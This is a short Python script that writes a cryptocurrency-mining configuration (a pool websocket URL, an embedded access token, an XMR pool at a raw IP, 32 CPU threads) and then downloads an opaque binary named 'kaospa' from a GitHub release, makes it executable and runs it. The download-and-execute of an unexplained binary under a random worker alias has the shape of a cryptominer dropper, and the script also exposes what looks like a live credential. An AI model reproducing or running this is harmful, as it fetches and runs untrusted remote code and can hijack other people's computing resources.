import os
import json
import random
import string
import subprocess
import stat
import urllib.request

# === 1. Generate random worker name ===
def generate_worker_name(prefix="worker"):
    letters = ''.join(random.choices(string.ascii_uppercase, k=4))
    digits = ''.join(random.choices(string.digits, k=4))
    return f"{prefix}_{letters}{digits}"

worker_name = generate_worker_name()
print(f"[+] Generated worker name: {worker_name}")

# === 2. Create JSON config ===
config = {
    "ClientSettings": {
        "poolAddress": "wss://pplnsjetski.xyz/ws/YEFTEEAYTSMKIDPBMGCTIDOZTKCBBGYTGANZMCLGTFWWARKYZGKZZSBBJOQN",
        "alias": worker_name,
        "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImZiZDRlODYyLTkxZWEtNDM1NS04YzFlLTA5Y2M2MmQwNjA2MiIsIk1pbmluZyI6IiIsIm5iZiI6MTc1NTcxMTY2MiwiZXhwIjoxNzg3MjQ3NjYyLCJpYXQiOjE3NTU3MTE2NjIsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.qPA6YWsSenUztyObsghbeePK28zNQ7iY3kazWsk9fJgegbcMo58SLal5Q1ytzPxfaMZIyLhActlzxjBT3G4mwayrzAiyh9IDqXh4CUWNQ54W1LPCzv-uQPuyjy8HNr7qJUFDI-fl54kBXBXGbkCfvghvkX0eP5w1pD0WAmpGTbUmCyead2U3NGDbs2a6DrdRi86uFVp8Pxzg_cwVuFuKFhJx5oVitBCIPPcYSSDz8m9l2C6B1icvwTWGXJnchlOIJ12cjFXpkq_DHhp_M4lWwpMpJGGsl1YKWQ22OrpVheJZM22z-rsgQ4RU3LVbGU1BoY3ssOFmtCnzIE_D5ekATg",
        "pps": True,
        "trainer": {
            "cpu": True,
            "gpu": False,
            "cpuThreads": 32
        },
        "xmrSettings": {
            "disable": False,
            "enableGpu": False,
            "poolAddress": "139.162.188.246:8088",
            "customParameters": "-t 32"
        }
    }
}

with open("appsettings.json", "w") as f:
    json.dump(config, f, indent=4)

print("[+] Created appsettings.json")

# === 3. Download the kaospa binary ===
kaospa_url = "https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa"
kaospa_filename = "kaospa"

if not os.path.exists(kaospa_filename):
    print("[+] Downloading kaospa binary...")
    urllib.request.urlretrieve(kaospa_url, kaospa_filename)
    print("[+] Download complete.")
else:
    print("[!] kaospa already exists. Skipping download.")

# === 4. Make executable (Linux/macOS only) ===
os.chmod(kaospa_filename, os.stat(kaospa_filename).st_mode | stat.S_IEXEC)
os.chmod("appsettings.json", os.stat("appsettings.json").st_mode | stat.S_IEXEC)
print("[+] Set executable permissions.")

# === 5. Run the binary ===
print("[+] Running ./kaospa ...")
subprocess.run(["./kaospa"])
